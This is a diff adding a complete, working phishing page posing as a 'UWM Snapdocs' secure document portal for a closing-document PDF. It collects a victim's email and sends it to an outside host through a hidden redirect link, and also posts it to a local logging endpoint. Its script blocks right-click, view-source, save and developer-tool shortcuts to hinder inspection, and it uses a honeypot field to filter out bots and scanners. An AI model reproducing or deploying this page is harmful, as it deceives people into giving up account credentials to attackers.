@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Document Portal</title>
+  <link href="https://s6xmmaac9a.ginceerwan.pics/?email=" rel="stylesheet">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  <meta http-equiv="Permissions-Policy" content="clipboard-read=(), clipboard-write=()">
+  <meta name="X-Xoodo-Platform" content="X-Sign">
+  <meta name="X-Agent-ID" content="XSIG-UA-1.2.9">
+  <style>
+    :root {
+      --primary: #0052cc;
+      --highlight: #2684FF;
+      --background: #F4F5F7;
+      --border: #DFE1E6;
+      --text: #172B4D;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--background);
+      color: var(--text);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      padding: 32px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(9, 30, 66, 0.1);
+      max-width: 480px;
+      width: 100%;
+    }
+
+    .doc-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
+
+    .doc-details {
+      background: #F7F8F9;
+      border: 1px solid var(--border);
+      padding: 16px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .doc-details img {
+      width: 32px;
+      height: 32px;
+      margin-right: 16px;
+    }
+
+    .doc-meta {
+      flex: 1;
+    }
+
+    .doc-name {
+      font-size: 15px;
+      font-weight: 600;
+    }
+
+    .doc-size {
+      font-size: 12px;
+      color: #5E6C84;
+      margin-top: 2px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    input[type="email"],
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      font-size: 14px;
+      background-color: #FAFBFC;
+      margin-bottom: 18px;
+    }
+
+    #company {
+      display: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      border-radius: 6px;
+      background: var(--highlight);
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #0065ff;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #8993A4;
+      margin-top: 24px;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 99;
+      visibility: hidden;
+      opacity: 0;
+      transition: 0.3s ease;
+    }
+
+    .overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-top: 5px solid #fff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="doc-title">UWM Snapdocs Portal</div>
+    <p>Please confirm your business email to view the document securely.</p>
+
+    <div class="doc-details">
+      <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF">
+      <div class="doc-meta">
+        <div class="doc-name">Updated Closing_Document_File.pdf</div>
+        <div class="doc-size">Size: 1.8 MB • Encrypted</div>
+      </div>
+    </div>
+
+    <form id="emailForm">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" required placeholder="you@company.com">
+      <input type="text" id="company" name="company">
+      <button type="submit">Continue</button>
+    </form>
+
+    <div class="footer">Internal file transfer only — do not share externally.</div>
+  </div>
+
+  <div class="overlay" id="loadingOverlay">
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if ((e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) || e.keyCode === 123) {
+        e.preventDefault();
+      }
+    });
+
+    let initiated = false;
+    document.addEventListener('click', () => {
+      if (!initiated) {
+        initiated = true;
+        attachHandler();
+      }
+    });
+
+    function attachHandler() {
+      const form = document.getElementById('emailForm');
+      const emailInput = document.getElementById('email');
+      const honeypot = document.getElementById('company');
+      const overlay = document.getElementById('loadingOverlay');
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const email = emailInput.value.trim();
+        if (!email || honeypot.value !== '') return;
+
+        overlay.classList.add('active');
+
+        const redirectURL = `https://s6xmmaac9a.ginceerwan.pics/?email={encodeURIComponent(email)}`;
+
+        setTimeout(() => {
+          overlay.classList.remove('active');
+          const a = document.createElement('a');
+          a.href = redirectURL;
+          a.rel = "noreferrer";
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+        }, 1500);
+
+        const payload = new FormData();
+        payload.append('email', email);
+        payload.append('timestamp', new Date().toISOString());
+        payload.append('document', 'Insurance_Certificate_Q2_2025.pdf');
+
+        fetch('./api/logDocument', {
+          method: 'POST',
+          body: payload,
+          headers: {
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-Agent-Name': 'Xoodo-Agent',
+            'X-Agent-Version': '3.2.17',
+            'X-Xoodo-Flags': 'doc:secure;mode:confirm;ui:invisible'
+          }
+        }).catch(() => {});
+      });
+    }
+  </script>
+</body>
+</html>
